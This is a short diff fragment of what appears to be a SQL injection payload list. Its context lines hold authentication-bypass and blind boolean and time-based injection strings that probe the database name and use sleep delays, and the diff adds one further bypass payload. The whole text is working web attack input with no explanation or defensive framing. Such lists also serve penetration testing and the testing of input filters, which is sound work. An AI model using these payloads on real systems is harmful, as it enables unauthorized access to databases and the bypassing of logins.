@@ -194,3 +194,4 @@ admin' or 1=1;--
 ?id=1' and substring(database(),1,1)="a"--+
 ?id=1' and sleep(2) and "a"="a"--+
 ?id=1' and sleep(2) and substring(database(),1,1)="a"--+
+'+||+1=1#
